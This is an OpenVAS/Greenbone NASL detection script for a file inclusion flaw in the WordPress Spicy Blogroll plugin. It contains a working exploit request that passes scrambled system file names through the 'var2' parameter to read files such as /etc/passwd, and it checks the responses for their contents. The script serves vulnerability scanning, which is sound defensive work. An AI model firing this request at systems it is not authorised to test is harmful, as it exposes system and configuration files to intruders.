# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803843");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-07-26 16:57:57 +0530 (Fri, 26 Jul 2013)");
  script_name("WordPress Spicy Blogroll Plugin File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://1337day.com/exploits/20994");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/26804");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013070111");

  script_tag(name:"summary", value:"WordPress Spicy Blogroll Plugin is prone to a file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Send a scrambled file name via HTTP GET request and check whether it is able
  to read the system file or not.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"insight", value:"Input passed via 'var2' and 'var4' parameters to
  '/spicy-blogroll/spicy-blogroll-ajax.php' script is not properly sanitised
  before being used in the code.");

  script_tag(name:"affected", value:"WordPress Spicy Blogroll Plugin version 1.0.0 and prior");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to bypass certain security
  restrictions and gain access to file system and other configuration files.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit(0);

if( dir == "/" )
  dir = "";

# Scrambled file names from traversal_files() spicy-blogroll-ajax.php will unscramble those file names.
foreach file( make_list( "CG-grec-r_uqjyb", "CG-dmqmr0gpgc", "CG-ygpulv-ygap,klkk", "CG-ygpxbquu-tygp,kalk" ) ) {

  url = dir + "/wp-content/plugins/spicy-blogroll/spicy-blogroll-ajax.php?var2=" + file;

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( "[boot loader]" >< res || "; for 16-bit app support" >< res ||
      egrep( pattern:".*root:.*:0:[01]:.*", string:res ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
